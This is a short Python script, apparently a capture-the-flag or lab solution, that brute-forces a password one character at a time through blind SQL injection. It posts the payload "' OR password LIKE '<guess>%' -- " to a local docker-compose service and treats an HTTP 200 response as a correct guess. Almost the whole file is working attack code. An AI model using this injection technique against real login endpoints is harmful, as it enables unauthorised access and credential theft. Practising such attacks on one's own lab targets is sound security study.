import string, requests
from repeat import repeat

# first run docker-compose up in a terminal

@repeat(
    string.ascii_letters + string.digits + '_-',
    30
)
def get_flag(candidate_string: str) -> bool:
    payload = f"' OR password LIKE '{candidate_string}%' -- "
    r = requests.post(
        'http://localhost:8080',
        json={
            'password': payload
        }
    )
    return r.status_code == 200

print(get_flag())
